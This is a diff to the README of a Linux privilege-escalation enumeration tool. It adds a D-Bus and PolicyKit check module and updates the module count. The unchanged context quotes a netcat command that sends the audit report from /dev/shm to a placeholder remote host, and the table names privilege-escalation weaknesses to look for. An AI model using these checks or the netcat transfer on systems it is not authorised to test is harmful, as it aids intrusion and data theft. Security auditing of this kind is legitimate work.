@@ -31,6 +31,7 @@ linPEAS is the standard for Linux privesc enumeration, but it's a ~35,000 line B
 | 13 | Services | Running/enabled services, writable systemd unit files, writable init.d scripts |
 | 14 | Interesting Files | Sensitive config files, backups, readable sensitive files, SUID outside standard paths (chrome-sandbox filtered), credential patterns in logs, recently modified files |
 | 15 | Security Protections | AppArmor, SELinux, ASLR, mmap_min_addr, kptr_restrict, dmesg_restrict, perf_event_paranoid, ptrace_scope, seccomp, protected_symlinks/hardlinks, unprivileged_userns_clone, unprivileged_bpf_disabled, modules_disabled, module_sig_enforce, lockdown mode, grsecurity/PaX detection |
+| 16 | D-Bus / PolicyKit | PolicyKit JS rules analysis (Result.YES/AUTH_SELF with group-awareness against current user), writable pkexec exec.path binaries, writable D-Bus service activation binaries (User=root Exec= path check), D-Bus service file writability, PolicyKit/D-Bus config directory and file writability across 5 paths. Zero spawns — all file reads |
 
 ## Build
 
@@ -101,7 +102,7 @@ nc <remote-ip> 4444 < /dev/shm/audit-report_<user>_<timestamp>.txt
 
 ## Status
 
-This is an active work-in-progress (v0.2.0). All 15 modules are functional. See [ARCHITECTURE.md](ARCHITECTURE.md) for design details and technical documentation.
+This is an active work-in-progress (v0.2.0). All 16 modules are functional. See [ARCHITECTURE.md](ARCHITECTURE.md) for design details and technical documentation.
 
 ## Known Limitations
 
